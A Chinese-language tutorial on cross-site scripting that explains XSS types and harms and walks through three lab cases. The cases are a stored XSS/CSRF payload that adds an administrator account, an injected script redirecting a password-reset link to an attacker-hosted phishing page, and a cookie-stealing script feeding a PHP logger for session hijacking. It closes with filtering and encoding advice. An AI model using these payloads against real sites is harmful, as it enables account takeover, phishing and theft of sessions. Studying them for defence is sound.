## **XSS漏洞简介**

XSS注入漏洞又称为"跨站脚本攻击(Cross Site Scripting)"，为了不和层叠样式表(Cascading Style
Sheets,CSS)混淆，所以将跨站脚本攻击缩写为XSS。XSS注入攻击的原理其实和SQL注入攻击的原理很相似，攻击者将恶意的Script代码插入到网页中，当正常用户浏览该页面时，被嵌入的恶意Script代码就会被执行，从而达到恶意攻击正常用户的目的。

###  **XSS分类**

跨站脚本注入漏洞是由于WEB服务器读取了用户可控数据输出到HTML页面的过程中没有进行安全处理导致的，用户可控数据包括url、参数、HTTP头部字段（cookie、referer、HOST等）、HTTP请求正文等。

> （1）反射型XSS：攻击者输入可控数据到HTML页面中（通常是url），所以输入的数据没有被存储，只能在单次请求中生效。
>
>
> （2）存储型XSS：攻击者输入可控数据到HTML页面（通常是POST表单：评论、留言板、登录框等），所以输入的数据会被存储到数据库中，由于数据经过存储，可以持续被读取出来，攻击的次数比反射型XSS多。
>
> （3）DOM-> XSS：攻击者可控数据通过JavaScript和DOM技术输出到HTML中，其实是一种特殊类型的反射型XSS，基于DOM文档对象模型的一种漏洞。

###  **XSS危害**

> （1）流量劫持，利用木马修改浏览器不停的弹出新的窗口强制性的让用户访问指定的网站，为指定网站增加流量
>
> （2）获取用户cookie信息，盗取账号（普通用户、管理员等账号）
>
> （3）篡改、删除页面信息（钓鱼操作）
>
> （4）配合CSRF攻击，实施进一步的攻击，控制被害人的电脑访问其他网站

###  **JavaScript代码**

JavaScript代码是客户端脚本语言，是浏览器的一部分，用来给HTML网页增加动态功能。

为什么要说一下JavaScript代码呢，在XSS注入攻击中所利用的Script代码就是它的一个标签，

所以简单介绍一下其中我们可以利用的语法和标签。

> <script>document.write()</script>方法；常用来网页向文档中输出内容。

![1616213763_6055770360d76a374fa85.png!small?1616213765098](https://image.3001.net/images/20210320/1616213763_6055770360d76a374fa85.png!small?1616213765098)

> <script>alert()</script>方法；弹出一个窗口。

![1616213840_605577502c97aa531a101.png!small?1616213841867](https://image.3001.net/images/20210320/1616213840_605577502c97aa531a101.png!small?1616213841867)

> <script>window.location.href='http://www.baidu.com'</script>方法；用于网页的跳转。

![1616213991_605577e7c9fd360b47a96.png!small?1616213993644](https://image.3001.net/images/20210320/1616213991_605577e7c9fd360b47a96.png!small?1616213993644)

> <script>alert(document.cookie)</script>方法；常用于获取网页的cookie。

![1616214124_6055786c89f889f39f62b.png!small?1616214126237](https://image.3001.net/images/20210320/1616214124_6055786c89f889f39f62b.png!small?1616214126237)

###  **XSS漏洞利用**

接下来了解了XSS注入攻击的原理以及利用的代码后，就可以尝试去验证网站是否存在XSS注入漏洞

 **案例一：利用XSS+CSRF增加网站管理员**

该网站由于在对管理员帐号编辑的地方，进行密码修改时没有进行2次校验或确认，存在CSRF漏洞，使用XSS脚本对该CSRF漏洞进行利用

通过注册新用户或者暴力破解等方式登入网站后台，权限不为admin，用于审计网站后台结构。将script代码在留言板发送给管理员，管理员查看留言板之后服务器会跳转界面执行指令

![1616217409_60558541d77a6de4b7559.png!small?1616217411559](https://image.3001.net/images/20210320/1616217409_60558541d77a6de4b7559.png!small?1616217411559)

代码部分为

    
    
    <script>function loadXMLDoc()
    
    {
    
    var xmlhttp=new XMLHttpRequest();
    
    xmlhttp.open("POST","http://10.10.10.135:81/510cms/admin/adminadd.php?admin=add",true);
    
    xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    
    xmlhttp.send("name=su&passwd=12345&remark= test∣=2&adminsubmit=%CC%E1%BD%BB");
    
    }
    
    loadXMLDoc();
    
    </script>
    
    xmlhttp.open(打开管理后台增加管理员的url)
    
    xmlhttp.send(然后传递value参数进去，增加passwd和name的值)

  

管理员界面显示效果如下，增加的留言内容被存储到数据库，并且当管理员查看留言板时攻击生效

![1616217652_60558634274c87f7751bf.png!small?1616217653825](https://image.3001.net/images/20210320/1616217652_60558634274c87f7751bf.png!small?1616217653825)

尝试利用新的管理员账号密码（su/12345）登入后台，下图为添加成功的su管理员

![1616217721_60558679b75e1fc65697e.png!small?1616217723396](https://image.3001.net/images/20210320/1616217721_60558679b75e1fc65697e.png!small?1616217723396)

 **案例二：CMS管理后台伪造钓鱼网站**

通过开发者工具查看源代码，发现name=“username”，说明是以双引号闭合为标签，并且在该网页有“忘记密码”模块。

![1616238596_6055d8043f2621e4977be.png!small?1616238597625](https://image.3001.net/images/20210320/1616238596_6055d8043f2621e4977be.png!small?1616238597625)

输入"><script>alert(666)</script><"后出现弹窗，说明存在XSS注入漏洞

XSS注入攻击原理：网页用户名post表单源码参数为name=“username”，我们需要构造一个闭合标签"><"，让<script>alert(666)</script>代码能够实现。

![1616238619_6055d81bd022b3dca3693.png!small?1616238621166](https://image.3001.net/images/20210320/1616238619_6055d81bd022b3dca3693.png!small?1616238621166)

点击忘记密码模块进入wjmm.php，我们将构造一个XSS注入攻击，让正常用户访问该页面的时候跳转到我们伪造的忘记密码页面，修改管理员的联系电话。

![1616239022_6055d9ae9f1cb2639cd75.png!small?1616239024182](https://image.3001.net/images/20210320/1616239022_6055d9ae9f1cb2639cd75.png!small?1616239024182)

首先我们要自己编译一个wjmm.php网页，将其放在我们的服务器上面，代码如下

![1616239132_6055da1c19ec00f2deea7.png!small?1616239133537](https://image.3001.net/images/20210320/1616239132_6055da1c19ec00f2deea7.png!small?1616239133537)

在管理系统的登入界面输入123"/><script>document.getElementsByTagName("body")[0].onload=function
changeLink(){document.getElementById("myId").href="http://xxx.xxx.123.1/wjmm.php";}</script><a，即可进行XSS漏洞注入;网页跳转到新的url界面。

![1616239267_6055daa37d669af9d0e53.png!small?1616239268813](https://image.3001.net/images/20210320/1616239267_6055daa37d669af9d0e53.png!small?1616239268813)

![1616239208_6055da68e4538754a693a.png!small?1616239210384](https://image.3001.net/images/20210320/1616239208_6055da68e4538754a693a.png!small?1616239210384)

点击忘记密码模块，跳转到本机服务器页面，并且管理员联系电话已被修改，可以做流量劫持，或做为一个钓鱼网站。

![1616239484_6055db7c354219e67d68d.png!small?1616239485636](https://image.3001.net/images/20210320/1616239484_6055db7c354219e67d68d.png!small?1616239485636)

 **案例三：网页留言板获取cookie**

在一个文章管理系统的留言板，存在存储型XSS注入漏洞，当管理员打开留言板信息查看的时候，触发其中的XSS代码，攻击者获取管理员cookie信息，可以用来做固定session会话攻击登陆后台。

文件管理系统的留言板下输入script的代码信息，当管理员查看留言板信息的时候将造成cookie的获取

![1616240159_6055de1f133e90c2e2f53.png!small?1616240160422](https://image.3001.net/images/20210320/1616240159_6055de1f133e90c2e2f53.png!small?1616240160422)

JavaScript代码

其中的 var
url为本机服务器的ip，访问该url后，记录cookie信息，然后通过post请求传送cookie信息，cookie1.php为本机创建的php文件，用来记录cookie信息。

![1616240204_6055de4c2a323bff30a0c.png!small?1616240205558](https://image.3001.net/images/20210320/1616240204_6055de4c2a323bff30a0c.png!small?1616240205558)

cookie1.php代码,用于接收传进来的$_POST['cookie']值，然后将其记录保存在cookie.txt文件夹中

![1616240340_6055ded42f2d9b8aaf07a.png!small?1616240341542](https://image.3001.net/images/20210320/1616240340_6055ded42f2d9b8aaf07a.png!small?1616240341542)

当管理员登录后，打开留言板模块，跳出弹窗获取username，userid，phpsessid信息

![1616240524_6055df8ce65019ef27311.png!small?1616240526285](https://image.3001.net/images/20210320/1616240524_6055df8ce65019ef27311.png!small?1616240526285)

查看cookie.txt文件，document.cookie保存的cookie信息将存入该文本中

![1616240614_6055dfe67099ce42bcf5d.png!small?1616240616498](https://image.3001.net/images/20210320/1616240614_6055dfe67099ce42bcf5d.png!small?1616240616498)

有了管理员的各种session值之后，可以通过插件cookie manager添加新的cookie等信息，在没有账号密码的情况下登录管理员界面。

![1616240749_6055e06d33136f667e51c.png!small?1616240750601](https://image.3001.net/images/20210320/1616240749_6055e06d33136f667e51c.png!small?1616240750601)

![1616240791_6055e097a93d44eb9925f.png!small?1616240793077](https://image.3001.net/images/20210320/1616240791_6055e097a93d44eb9925f.png!small?1616240793077)

##  **总结**

作为OWASP TOP10中的漏洞之一，XSS注入漏洞在WEB安全中还是有很多案例存在。

##  **安全建议**

建站人员应该提前做好防护措施。可以在服务端对用户可控数据进行过滤和编码操作，如将所有on事件,script等关键字进行过滤，将所有<,>,”,’,=等特殊符号进行实体化编码或百分号编码便可以修复。

